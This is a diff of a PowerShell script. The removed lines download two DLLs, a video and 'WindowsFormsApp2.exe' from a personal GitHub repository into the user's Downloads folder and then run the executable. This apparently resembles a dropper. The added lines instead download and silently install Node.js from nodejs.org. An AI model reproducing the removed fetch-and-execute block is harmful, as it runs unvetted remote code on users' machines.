@@ -1,24 +1,14 @@
-$urls = @(
-    "https://github.com/webntdev/webntdev.github.io/raw/main/application/AxInterop.WMPLib.dll",
-    "https://github.com/webntdev/webntdev.github.io/raw/main/application/Interop.WMPLib.dll",
-    "https://github.com/webntdev/webntdev.github.io/raw/main/application/video.mp4",
-    "https://github.com/webntdev/webntdev.github.io/raw/main/application/WindowsFormsApp2.exe"
-)
+# Define the URL for the Node.js Windows Installer
+$nodeJsInstallerUrl = "https://nodejs.org/dist/v16.13.0/node-v16.13.0-x64.msi" # You can update this URL to the version you need
 
-$filePath = Join-Path -Path $env:USERPROFILE -ChildPath "Downloads\wheiu.bz"
+# Specify the path where the installer will be downloaded
+$installerPath = "$env:TEMP\nodejs-installer.msi"
 
-Start-Sleep -Seconds 1
+# Download the installer
+Invoke-WebRequest -Uri $nodeJsInstallerUrl -OutFile $installerPath
 
-$downloadDir = [System.Environment]::ExpandEnvironmentVariables('%USERPROFILE%\Downloads')
-if (-not (Test-Path -Path $downloadDir)) {
-    New-Item -ItemType Directory -Path $downloadDir
-}
+# Install Node.js silently
+Start-Process msiexec.exe -Wait -ArgumentList "/i $installerPath /quiet"
 
-foreach ($url in $urls) {
-    $fileName = [System.IO.Path]::GetFileName($url)
-    $destinationPath = Join-Path -Path $downloadDir -ChildPath $fileName
-    Invoke-WebRequest -Uri $url -OutFile $destinationPath
-}
-
-$exePath = Join-Path -Path $downloadDir -ChildPath "WindowsFormsApp2.exe"
-Start-Process -FilePath $exePath
+# Optionally, remove the installer file after installation
+Remove-Item -Path $installerPath
